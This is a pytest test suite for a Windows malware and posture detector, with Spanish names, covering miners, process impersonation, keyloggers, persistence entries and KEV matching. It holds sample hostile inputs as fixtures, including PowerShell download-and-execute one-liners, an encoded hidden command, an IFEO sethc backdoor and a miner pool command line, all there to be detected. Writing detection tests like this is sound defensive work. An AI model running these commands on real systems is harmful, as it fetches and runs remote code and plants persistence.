"""Reglas de seguridad de Windows (funciones puras) con procesos, firmas, arranque y postura simulados. Corre en Linux."""

from datetime import date

import pytest

from plataforma import windows_seguridad as ws

WIN = "C:\\Windows"
SYS = "C:\\Windows\\System32\\"
ENTORNO = {"SystemRoot": WIN, "windir": WIN, "ProgramData": "C:\\ProgramData", "APPDATA": "C:\\Users\\v\\AppData\\Roaming"}
MALA = {"estado": "NotSigned", "firmante": ""}
MS = {"estado": "Valid", "firmante": "CN=Microsoft Corporation, O=Microsoft Corporation"}
VALIDA = {"estado": "Valid", "firmante": 'CN="Valve Corp.", O="Valve Corp."'}


def P(pid, nombre, exe="", cmd="", padre=""):
    return {"pid": pid, "nombre": nombre, "exe": exe, "cmd": cmd or exe, "ppid": 1, "padre": padre}


def ctx(**kw):
    return {"windir": WIN, "pids_propios": set(), "nocoin": set(), "ventanas": set(), "firmas": {}, "salientes": {}, "persistentes": set(),
            "config_minero": set(), "rachas": {}, "juego": False, **kw}


def reglas(hallazgos):
    return sorted(h["regla"] for h in hallazgos)


def evaluar(procesos, **kw):
    return ws.evaluar_procesos(procesos, ctx(**kw))


# ---------- utilidades ----------

@pytest.mark.parametrize("comando,esperado", [
    ('"C:\\Program Files (x86)\\Steam\\steam.exe" -silent', "C:\\Program Files (x86)\\Steam\\steam.exe"),
    ("C:\\Program Files\\Valve\\steam.exe /s", "C:\\Program Files\\Valve\\steam.exe"),
    ("C:\\Windows\\System32\\rundll32.exe C:\\evil\\x.dll,Entry", "C:\\evil\\x.dll"),
    ("%APPDATA%\\app\\a.exe --x", "C:\\Users\\v\\AppData\\Roaming\\app\\a.exe"),
    ("cmd.exe /c C:\\foo.exe", ""), ("powershell -enc AAAA", ""), ("", ""), (None, ""),
])
def test_el_ejecutable_de_una_linea_de_comandos(comando, esperado):
    assert ws.exe_de_comando(comando, ENTORNO) == esperado


def test_nombres_y_rutas_se_comparan_sin_importar_mayusculas_ni_barras():
    assert ws.stem("C:/Tools/XMRig.EXE") == "xmrig" and ws.norm("C:/A/B.exe") == "c:\\a\\b.exe"
    assert ws.en_ruta_de_usuario("C:\\Users\\v\\AppData\\Local\\Temp\\a.exe") and not ws.en_ruta_de_usuario("C:\\Program Files\\x\\a.exe")
    assert ws.bajo("C:\\Windows\\System32\\a.exe", WIN) and not ws.bajo("C:\\WindowsApps\\a.exe", WIN)


def test_la_firma_sin_dato_no_es_mala_y_se_describe():
    assert not ws.firma_mala(None) and ws.firma_mala(MALA) and not ws.firma_mala(VALIDA) and ws.firma_microsoft(MS) and not ws.firma_microsoft(VALIDA)
    assert ws.describir_firma(MALA) == "sin firma digital" and ws.describir_firma(VALIDA) == "firmado por Valve Corp." and ws.describir_firma(None) == "firma sin verificar"


# ---------- minería ----------

def test_un_minero_por_nombre_por_argumentos_o_por_pool():
    r = evaluar([P(1, "XMRig.exe", "C:\\t\\xmrig.exe"), P(2, "a.exe", "C:\\t\\a.exe", "a.exe -o pool.minexmr.com:4444 --donate-level 1"),
                 P(3, "b.exe", "C:\\t\\b.exe", "b.exe --url nanopool.org:9999"), P(5, "NiceHash.exe", "C:\\t\\n.exe")])
    assert sorted((h["pid"], h["regla"]) for h in r) == [(1, "nombre_conocido"), (2, "cmdline_minero"), (3, "pool_en_cmdline"), (5, "nombre_conocido")]
    assert all(h["categoria"] == "minero" and h["severidad"] == "alta" for h in r)


def test_cuda_y_opencl_solos_son_solo_una_sospecha_media_y_microsoft_no_cuenta():
    r = evaluar([P(1, "calc.exe", "C:\\t\\calc.exe", "calc.exe --cuda --n 4")])
    assert [(h["regla"], h["severidad"]) for h in r] == [("cmdline_gpu_dudoso", "media")]
    assert evaluar([P(1, "calc.exe", "C:\\t\\calc.exe", "calc.exe --cuda")], firmas={ws.norm("C:\\t\\calc.exe"): MS}) == []


def test_la_lista_nocoin_y_la_configuracion_de_minero_junto_al_exe():
    r = evaluar([P(1, "x.exe", "C:\\t\\x.exe", "x.exe http://coin-hive.com/lib.js")], nocoin={"coin-hive.com"})
    assert [h["regla"] for h in r] == ["nocoin_cmdline"]
    r = evaluar([P(2, "y.exe", "C:\\t\\y.exe")], config_minero={ws.norm("C:\\t\\y.exe")})
    assert [h["regla"] for h in r] == ["config_junto_al_exe"] and r[0]["categoria"] == "minero"


def test_uso_sostenido_sin_ventana_ni_juego_necesita_la_racha_completa():
    exe = "C:\\Users\\v\\AppData\\Local\\svc\\svc.exe"
    p = [P(1, "svc.exe", exe)]
    assert evaluar(p, rachas={"uso:svc": 3}) == []
    r = evaluar(p, rachas={"uso:svc": 4})
    assert [(h["regla"], h["severidad"]) for h in r] == [("uso_sostenido_sin_ventana", "alta")]    # carpeta del usuario: alta
    assert "60 min" in r[0]["detalle"]
    assert evaluar(p, rachas={"uso:svc": 8}, ventanas={1}) == [] and evaluar(p, rachas={"uso:svc": 8}, juego=True) == []   # tiene ventana / hay un juego
    r = evaluar([P(1, "render.exe", "C:\\Program Files\\r\\render.exe")], rachas={"uso:render": 5}, firmas={ws.norm("C:\\Program Files\\r\\render.exe"): VALIDA})
    assert [h["severidad"] for h in r] == ["media"]
    assert evaluar([P(1, "MsMpEng.exe", "C:\\ProgramData\\Microsoft\\Windows Defender\\MsMpEng.exe")], rachas={"uso:msmpeng": 9},
                   firmas={ws.norm("C:\\ProgramData\\Microsoft\\Windows Defender\\MsMpEng.exe"): MS}) == []   # firmado por Microsoft
    assert evaluar([P(1, "svchost.exe", SYS + "svchost.exe", padre="services.exe")], rachas={"uso:svchost": 9}) == []   # en la carpeta de Windows


# ---------- suplantación ----------

def test_un_proceso_del_sistema_en_su_lugar_no_genera_nada():
    r = evaluar([P(1, "svchost.exe", SYS + "svchost.exe", padre="services.exe"), P(2, "lsass.exe", SYS + "lsass.exe", padre="wininit.exe"),
                 P(3, "services.exe", SYS + "services.exe", padre="wininit.exe"), P(4, "explorer.exe", WIN + "\\explorer.exe", padre="userinit.exe"),
                 P(5, "csrss.exe", SYS + "csrss.exe"), P(6, "winlogon.exe", SYS + "winlogon.exe")])
    assert r == []


def test_un_proceso_del_sistema_fuera_de_su_ruta_es_una_suplantacion():
    r = evaluar([P(1, "svchost.exe", "C:\\Users\\v\\AppData\\Local\\Temp\\svchost.exe", padre="services.exe"), P(2, "explorer.exe", SYS + "explorer.exe")])
    assert [(h["pid"], h["regla"], h["categoria"], h["severidad"]) for h in r] == [(1, "sistema_fuera_de_ruta", "fantasma", "alta"), (2, "sistema_fuera_de_ruta", "fantasma", "alta")]


def test_si_windows_no_deja_leer_la_ruta_no_se_acusa_a_nadie():
    assert evaluar([P(1, "svchost.exe", "", padre="services.exe"), P(2, "lsass.exe", "", padre="wininit.exe")]) == []


def test_padres_anomalos_y_lsass_duplicado():
    r = evaluar([P(1, "svchost.exe", SYS + "svchost.exe", padre="cmd.exe"), P(2, "svchost.exe", SYS + "svchost.exe", padre="")])
    assert reglas(r) == ["padre_anomalo", "padre_anomalo"]
    r = evaluar([P(13, "lsass.exe", SYS + "lsass.exe", padre="wininit.exe"), P(14, "lsass.exe", SYS + "lsass.exe", padre="wininit.exe")])
    assert reglas(r) == ["proceso_duplicado", "proceso_duplicado"]
    assert reglas(evaluar([P(5, "lsass.exe", SYS + "lsass.exe", padre="explorer.exe")])) == ["padre_anomalo"]


@pytest.mark.parametrize("nombre", ["svch0st.exe", "scvhost.exe", "lsas.exe", "expl0rer.exe", "csrs5.exe"])
def test_nombres_casi_iguales_a_los_del_sistema(nombre):
    exe = f"C:\\Users\\v\\AppData\\Roaming\\{nombre}"
    r = evaluar([P(1, nombre, exe)])
    assert reglas(r) == ["nombre_parecido"] and r[0]["severidad"] == "alta"


@pytest.mark.parametrize("nombre,exe", [("chrome.exe", "C:\\Program Files\\Google\\chrome.exe"), ("service.exe", WIN + "\\System32\\service.exe"),
                                        ("svc.exe", "C:\\a\\svc.exe"), ("explorer++.exe", "C:\\Program Files\\Explorer++\\explorer++.exe")])
def test_nombres_normales_o_dentro_de_windows_no_se_confunden(nombre, exe):
    assert evaluar([P(1, nombre, exe)]) == []


def test_intérpretes_hijos_de_office_o_del_navegador_y_powershell_oculto():
    r = evaluar([P(1, "cmd.exe", SYS + "cmd.exe", padre="WINWORD.EXE"), P(2, "powershell.exe", "", padre="chrome.exe"),
                 P(3, "powershell.exe", "", "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"),
                 P(14, "pwsh.exe", "", "pwsh -c IEX (New-Object Net.WebClient).DownloadString('http://x/y')"),
                 P(5, "powershell.exe", "", "powershell.exe -c Invoke-WebRequest http://x/a.zip -OutFile a.zip"),
                 P(6, "powershell.exe", "", "powershell.exe -NoProfile -File C:\\scripts\\backup.ps1")])
    por_pid = {}
    for h in r:
        por_pid.setdefault(h["pid"], []).append((h["regla"], h["severidad"]))
    assert por_pid == {1: [("interprete_hijo_de_office", "alta")], 2: [("interprete_hijo_de_navegador", "media")],
                       3: [("powershell_sospechoso", "alta")], 14: [("powershell_sospechoso", "alta")], 5: [("powershell_descarga", "media")]}


def test_los_procesos_propios_y_el_sistema_no_se_revisan():
    assert evaluar([P(7, "powershell.exe", "", "powershell -EncodedCommand " + "A" * 40), P(0, "xmrig.exe"), P(4, "xmrig.exe")], pids_propios={7}) == []


# ---------- espías ----------

def test_keylogger_por_nombre_y_rat_conocido():
    r = evaluar([P(1, "Ardamax.exe", "C:\\a\\a.exe"), P(2, "njRAT.exe", "C:\\a\\n.exe"), P(3, "MyKeyLogger2.exe", "C:\\a\\k.exe")])
    assert [h["categoria"] for h in r] == ["keylogger"] * 3 and {h["regla"] for h in r} == {"nombre_conocido"}


def test_sin_firma_en_carpeta_de_usuario_solo_cuenta_con_arranque_o_salida():
    exe = "C:\\Users\\v\\AppData\\Roaming\\x\\x.exe"
    firmas = {ws.norm(exe): MALA}
    p = [P(10, "x.exe", exe)]
    assert evaluar(p, firmas=firmas) == []                                                    # sola no alcanza
    r = evaluar(p, firmas=firmas, persistentes={ws.norm(exe)})
    assert [(h["regla"], h["severidad"]) for h in r] == [("sin_firma_en_ruta_de_usuario", "media")]
    r = evaluar(p, firmas=firmas, persistentes={ws.norm(exe)}, salientes={10: 2})
    assert r[0]["severidad"] == "alta" and "está en el arranque y tiene 2" in r[0]["detalle"]
    assert evaluar(p, firmas={ws.norm(exe): VALIDA}, persistentes={ws.norm(exe)}) == []      # firmado: no
    assert evaluar(p, persistentes={ws.norm(exe)}) == []                                     # sin dato de firma: no se inventa


def test_conexion_saliente_sostenida_sin_ventana():
    exe = "C:\\Users\\v\\AppData\\Local\\y\\y.exe"
    p = [P(1, "y.exe", exe)]
    kw = dict(firmas={ws.norm(exe): MALA}, rachas={f"con:{ws.norm(exe)}": 3})
    assert [h["regla"] for h in evaluar(p, **kw)] == ["sin_ventana_con_salida_persistente"]
    assert evaluar(p, **kw, ventanas={1}) == [] and evaluar(p, firmas=kw["firmas"], rachas={f"con:{ws.norm(exe)}": 2}) == []


def test_la_huella_no_depende_del_pid():
    a = evaluar([P(1, "xmrig.exe", "C:\\t\\xmrig.exe")])[0]["huella"]
    assert a == evaluar([P(999, "xmrig.exe", "C:\\t\\xmrig.exe")])[0]["huella"]


# ---------- arranque ----------

DATOS = {
    "run": [{"hive": "HKCU", "clave": "run", "nombre": "Steam", "valor": '"C:\\Program Files (x86)\\Steam\\steam.exe" -silent'},
            {"hive": "HKCU", "clave": "run", "nombre": "Updater", "valor": "C:\\Users\\v\\AppData\\Roaming\\upd\\upd.exe /s"}],
    "tareas": [{"Ruta": "\\", "Nombre": "Backup", "Ejecuta": "C:\\Program Files\\B\\b.exe", "Argumentos": "--auto"}, {"Ruta": "\\", "Nombre": "Sin accion"}],
    "servicios": [{"Name": "nvsvc", "PathName": '"C:\\Program Files\\NVIDIA\\nvsvc.exe"'}, {"Name": "vacio", "PathName": None}],
    "inicio": [{"Nombre": "x.lnk", "Ruta": "C:\\Users\\v\\Start\\x.lnk", "Destino": "C:\\apps\\x.exe", "Argumentos": ""}],
    "wmi": {"consumidores": [{"Name": "evil", "CommandLineTemplate": "powershell -enc AAAA"}, {"Name": "SCM Event Log Consumer"}]},
    "winlogon": {"Shell": "explorer.exe", "Userinit": "C:\\Windows\\system32\\userinit.exe,"},
    "ifeo": {"sethc.exe": "C:\\Windows\\System32\\cmd.exe"}, "appinit": ["C:\\evil.dll"],
}


def test_todas_las_fuentes_de_arranque_se_juntan():
    items = ws.items_persistencia(DATOS, ENTORNO)
    assert sorted((i["tipo"], i["nombre"]) for i in items) == sorted([
        ("run", "HKCU\\Steam"), ("run", "HKCU\\Updater"), ("tarea", "\\Backup"), ("servicio", "nvsvc"), ("inicio", "x.lnk"),
        ("wmi", "evil"), ("ifeo", "sethc.exe"), ("appinit", "AppInit_DLLs")])
    assert next(i for i in items if i["nombre"] == "HKCU\\Updater")["exe"] == "C:\\Users\\v\\AppData\\Roaming\\upd\\upd.exe"
    assert next(i for i in items if i["tipo"] == "inicio")["exe"] == "C:\\apps\\x.exe"


def test_winlogon_modificado_es_sospechoso_y_el_normal_no():
    datos = {**DATOS, "winlogon": {"Shell": "explorer.exe, C:\\evil.exe", "Userinit": "C:\\Windows\\system32\\userinit.exe,"}}
    assert [i["nombre"] for i in ws.items_persistencia(datos, ENTORNO) if i["tipo"] == "winlogon"] == ["Shell"]
    assert not [i for i in ws.items_persistencia(DATOS, ENTORNO) if i["tipo"] == "winlogon"]


def test_la_primera_corrida_registra_todo_sin_avisar_de_lo_nuevo_pero_si_lo_sospechoso():
    items = ws.items_persistencia(DATOS, ENTORNO)
    firmas = {ws.norm("C:\\Users\\v\\AppData\\Roaming\\upd\\upd.exe"): MALA}
    hallazgos, nuevos = ws.hallazgos_persistencia(items, firmas, set(), es_base=True)
    assert len(nuevos) == len(items)
    assert sorted(h["regla"] for h in hallazgos) == ["appinit_sospechoso", "ifeo_sospechoso", "run_sin_firma_en_ruta_de_usuario", "wmi_sospechoso"]
    assert {h["severidad"] for h in hallazgos if h["regla"] != "run_sin_firma_en_ruta_de_usuario"} == {"alta"}
    assert all(h["categoria"] == "persistencia" for h in hallazgos)


def test_algo_nuevo_en_el_arranque_se_avisa_una_vez_con_su_firma():
    items = ws.items_persistencia(DATOS, ENTORNO)
    conocidos = {f"{i['tipo']}|{i['nombre']}|{i['comando']}" for i in items}
    assert ws.hallazgos_persistencia(items, {}, conocidos, es_base=False) [1] == []
    nuevo = ws.items_persistencia({**DATOS, "run": DATOS["run"][:1] + [{"hive": "HKLM", "clave": "run", "nombre": "Nuevo", "valor": "C:\\Program Files\\N\\n.exe"}]}, ENTORNO)
    h, n = ws.hallazgos_persistencia(nuevo, {ws.norm("C:\\Program Files\\N\\n.exe"): VALIDA}, conocidos, es_base=False)
    assert [(x["regla"], x["severidad"]) for x in h if x["regla"].endswith("_nuevo")] == [("run_nuevo", "baja")]
    assert "firmado por" in next(x for x in h if x["regla"] == "run_nuevo")["detalle"] and len(n) == 1
    h, _ = ws.hallazgos_persistencia(nuevo, {ws.norm("C:\\Program Files\\N\\n.exe"): MALA}, conocidos, es_base=False)
    assert next(x for x in h if x["regla"] == "run_nuevo")["severidad"] == "media"       # sin firma: media


def test_comando_de_arranque_ofuscado():
    datos = {"run": [{"hive": "HKCU", "clave": "run", "nombre": "x", "valor": "powershell -w hidden -c iex (iwr http://x/y)"}]}
    h, _ = ws.hallazgos_persistencia(ws.items_persistencia(datos, ENTORNO), {}, set(), es_base=True)
    assert [x["regla"] for x in h] == ["run_sospechoso"]


# ---------- postura ----------

HOY = date(2026, 10, 29)
SANO = {"defender": {"rtp": True, "firmas_dias": 1, "rapido_dias": 2, "modo": "Normal"}, "amenazas": [],
        "firewall": [{"Name": "Domain", "Enabled": "True"}, {"Name": "Private", "Enabled": "True"}, {"Name": "Public", "Enabled": "True"}],
        "hotfix_dias": 12, "uac": 1, "smb1": 0, "rdp": {"activo": False, "nla": 1}}


def postura(d=None, build=26200, edicion="Windows 11 Pro", upgrades=None):
    return ws.evaluar_postura({**SANO, **(d or {})}, HOY, build, edicion, upgrades)


def test_un_equipo_sano_no_tiene_hallazgos_de_postura():
    assert postura() == []


def test_defender_firewall_uac_smb_y_rdp():
    r = postura({"defender": {"rtp": False, "firmas_dias": 40, "rapido_dias": 60, "modo": "Normal"},
                 "firewall": [{"Name": "Public", "Enabled": "False"}, {"Name": "Private", "Enabled": 0}, {"Name": "Domain", "Enabled": 2}],
                 "uac": 0, "smb1": 1, "rdp": {"activo": True, "nla": 0}})
    por = {h["regla"]: h["severidad"] for h in r}
    assert por == {"defender_sin_proteccion": "alta", "defender_firmas_viejas": "alta", "defender_sin_escaneo": "baja", "firewall_public": "alta",
                   "firewall_private": "media", "uac_desactivado": "alta", "smb1_activo": "alta", "rdp_sin_nla": "alta"}
    assert all(h["categoria"] == "postura" for h in r)


def test_con_otro_antivirus_defender_pasivo_no_alarma():
    r = postura({"defender": {"rtp": False, "firmas_dias": 90, "rapido_dias": 90, "modo": "Passive Mode"}})
    assert [(h["regla"], h["severidad"]) for h in r] == [("defender_pasivo", "baja")]


def test_rdp_con_nla_no_es_hallazgo_y_sin_dato_de_registro_tampoco():
    assert postura({"rdp": {"activo": True, "nla": 1}}) == [] and postura({"uac": None, "smb1": None, "rdp": {}}) == []


def test_amenazas_recientes_de_defender():
    r = postura({"amenazas": [{"ThreatID": 2147, "Nombre": "Trojan:Win32/Wacatac", "Recursos": "file:_C:\\Users\\v\\Downloads\\a.exe", "Accion": False}]})
    assert [(h["regla"], h["severidad"], h["nombre"]) for h in r] == [("defender_amenaza", "alta", "Trojan:Win32/Wacatac")] and "sin acción exitosa" in r[0]["detalle"]


def test_parches_viejos_y_windows_sin_soporte_segun_edicion():
    assert [(h["regla"], h["severidad"]) for h in postura({"hotfix_dias": 75})] == [("sin_parches_recientes", "media")]
    assert postura({"hotfix_dias": 200})[0]["severidad"] == "alta"
    r = postura(build=19045, edicion="Windows 10 Pro")
    assert [h["regla"] for h in r] == ["windows_sin_soporte"] and "2025-10-14" in r[0]["detalle"]
    assert postura(build=19045, edicion="Windows 10 Enterprise") == [] and postura(build=99999) == [] and postura(build=None) == []   # edición con más soporte / build que no está en la tabla
    assert postura(build=26100, edicion="Windows 11 Home")[0]["regla"] == "windows_sin_soporte"


def test_programas_desactualizados_se_informan_en_un_solo_hallazgo():
    ups = [{"Name": f"Programa {i}", "Id": f"X.{i}"} for i in range(25)]
    r = postura(upgrades=ups[:3])
    assert [(h["regla"], h["severidad"]) for h in r] == [("programas_desactualizados", "baja")] and "3 programa(s)" in r[0]["detalle"]
    assert postura(upgrades=ups)[0]["severidad"] == "media" and postura(upgrades=[]) == []


# ---------- KEV ----------

KEV = {"vulnerabilities": [{"cveID": "CVE-2023-1", "vendorProject": "Mozilla", "product": "Firefox"}, {"cveID": "CVE-2023-5", "vendorProject": "Mozilla", "product": "Firefox"},
                           {"cveID": "CVE-2023-2", "vendorProject": "Microsoft", "product": "Windows"}, {"cveID": "CVE-2022-9", "vendorProject": "7-Zip", "product": "7-Zip"},
                           {"cveID": "CVE-2024-3", "vendorProject": "Google", "product": "Chromium V8"}, {"cveID": "CVE-1", "vendorProject": "X", "product": "Go"}]}


def test_kev_coincide_por_nombre_y_lo_dice_como_revisar():
    progs = [("Mozilla Firefox (x64 es-AR)", "126", "registro"), ("Windows Driver Package", "1", "registro"), ("7-Zip 23.01 (x64)", "23", "registro"),
             ("Google Chrome", "1", "registro"), ("Go Programming Language", "1", "registro")]
    r = ws.coincidencias_kev(KEV, progs)
    assert [(h["nombre"], h["severidad"], h["categoria"]) for h in r] == [("Mozilla Firefox (x64 es-AR)", "baja", "vulnerabilidad"), ("7-Zip 23.01 (x64)", "baja", "vulnerabilidad")]
    assert "REVISAR" in r[0]["detalle"] and "no significa que esté vulnerable" in r[0]["detalle"] and "2 CVE" in r[0]["detalle"] and "vulnerable" not in r[0]["regla"]
    assert ws.coincidencias_kev({}, progs) == [] and ws.coincidencias_kev(None, progs) == []


def test_los_servicios_y_tareas_de_microsoft_no_se_siguen():
    datos = {"servicios": [{"Name": "wuauserv", "PathName": "C:\\Windows\\system32\\svchost.exe -k netsvcs"},
                          {"Name": "MsMpSvc", "PathName": '"C:\\ProgramData\\Microsoft\\Windows Defender\\MsMpEng.exe"'},
                          {"Name": "nvsvc", "PathName": '"C:\\Program Files\\NVIDIA\\nvsvc.exe"'}],
             "tareas": [{"Ruta": "\\", "Nombre": "Edge", "Ejecuta": "C:\\Program Files (x86)\\Microsoft\\Edge\\u.exe"}]}
    items = ws.items_persistencia(datos, ENTORNO)
    firmas = {ws.norm("C:\\ProgramData\\Microsoft\\Windows Defender\\MsMpEng.exe"): MS, ws.norm("C:\\Program Files (x86)\\Microsoft\\Edge\\u.exe"): MS,
              ws.norm("C:\\Program Files\\NVIDIA\\nvsvc.exe"): VALIDA}
    h, nuevos = ws.hallazgos_persistencia(items, firmas, set(), es_base=False, windir=WIN)
    assert [i["nombre"] for i in nuevos] == ["nvsvc"] and [x["regla"] for x in h] == ["servicio_nuevo"]
